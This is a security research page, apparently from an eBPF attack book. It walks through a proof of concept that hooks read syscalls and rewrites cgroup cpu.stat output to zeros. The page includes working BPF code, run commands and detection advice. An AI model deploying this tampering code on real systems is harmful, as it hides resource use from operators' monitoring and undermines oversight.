---
layout: book
title: "Slipping the Cgroup Leash"
date: 2025-02-05
poc_dir: dBPF-pocs/pocs/ch05-cgroup-leash
---

# Slipping the Cgroup Leash

> **See also**: [Full investigation notes in the book]({{ site.baseurl }}/book/act-1/chapter-5-slipping-the-cgroup-leash.html) · [POC source](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05-cgroup-leash)

The target here is not the cgroup enforcement path. It is the readback path. The scheduler keeps accounting CPU correctly and keeps throttling the cgroup if it exceeds its quota. What changes is what `cat /sys/fs/cgroup/cpu.stat` returns to the reader.

Prior art on `cpu.stat` spoofing via BPF goes back to ~2021. The contribution here is a harness with clean BEFORE/AFTER.

## Mechanism

Two syscall tracepoints do the work: `sys_enter_read` identifies reads of a file named `cpu.stat` (via `current->files->fdt->fd[fd]->f_path.dentry->d_name.name`) and stashes the user buffer pointer in a per-pid map; `sys_exit_read` checks the flag, and if the read succeeded, uses `bpf_probe_write_user` to overwrite the returned bytes with three lines of zeros.

```c
SEC("tracepoint/syscalls/sys_enter_read")
int tp_enter_read(struct trace_event_raw_sys_enter *ctx) {
    int fd = (int)ctx->args[0];
    char *ubuf = (void *)(unsigned long)ctx->args[1];
    size_t nbytes = (size_t)ctx->args[2];

    // resolve fd -> dentry -> basename
    struct task_struct *task = (void *)bpf_get_current_task();
    struct file *f = BPF_CORE_READ(task, files, fdt, fd[fd]);
    char name[32] = {};
    BPF_CORE_READ_STR_INTO(&name, f, f_path.dentry, d_name.name);

    // bounded compare against "cpu.stat"
    if (!streq_bounded(name, "cpu.stat", 8)) return 0;

    u64 id = bpf_get_current_pid_tgid();
    struct pending p = { .ubuf = ubuf, .nbytes = nbytes };
    bpf_map_update_elem(&inflight, &id, &p, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int tp_exit_read(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct pending *p = bpf_map_lookup_elem(&inflight, &id);
    if (!p) return 0;
    long ret = ctx->ret;
    if (ret <= 0) goto out;

    static const char zeros[] =
        "usage_usec 0\nuser_usec 0\nsystem_usec 0\n";
    long n = sizeof(zeros) - 1;
    if (n > ret) n = ret;
    bpf_probe_write_user(p->ubuf, zeros, n);

    struct evt e = { .pid = id >> 32, .patched = 1, .bytes = n };
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
out:
    bpf_map_delete_elem(&inflight, &id);
    return 0;
}
```

Verifier notes from the investigation: unbounded string compare against `"cpu.stat"` is rejected; you have to `#pragma unroll` a bounded loop or use `streq_bounded` with a constant length.

## Hook points

- `tp/syscalls/sys_enter_read` — identify reads of `cpu.stat`, stash user buffer.
- `tp/syscalls/sys_exit_read` — overwrite user buffer on success.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch05-cgroup-leash
make
sudo ./build/ch05-cgroup-leash &
# baseline
cat /sys/fs/cgroup/cpu.stat          # real usage
# loader running
cat /sys/fs/cgroup/cpu.stat          # zeros
# expect: === CH05_PROVEN before_usage=<N> after_usage=0 zeroed=yes ===
```

## Detection

- `bpf_probe_write_user` invocation taints the kernel: `cat /proc/sys/kernel/tainted` shows a non-zero bit (`TAINT_USER` = 512 on most kernels).
- `dmesg` emits a one-line warning on first `bpf_probe_write_user` use per program.
- An out-of-band monitor that reads `/proc/[pid]/cgroup.stat` or computes usage from `/proc/schedstat` + per-task accounting gives a cross-check — if the scheduler says the cgroup ran hot but `cpu.stat` says zero, something is rewriting the readback.
- `bpftool prog show | grep tracepoint` — a tracepoint on `sys_exit_read` with `bpf_probe_write_user` calls is an unusual fingerprint.

## Scope

Class II primitive from chapter 20 (userspace buffer rewrite). Anything gated on `cpu.stat` for metrics (Prometheus node-exporter, Datadog, Netdata, k8s metrics-server, Sysdig) is affected. Anything consulting the scheduler directly is not. The same shape trivially extends to `memory.current`, `io.stat`, and `cpu.pressure`.

---

**Related material**

- Full chapter: [Chapter 5 — Slipping the Cgroup Leash]({{ site.baseurl }}/book/act-1/chapter-5-slipping-the-cgroup-leash.html)
- POC source: [dBPF-pocs/pocs/ch05-cgroup-leash/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05-cgroup-leash)
- Harness entry: search for `Poc("ch05", ...)` in `dBPF-pocs/harness/proof.py`
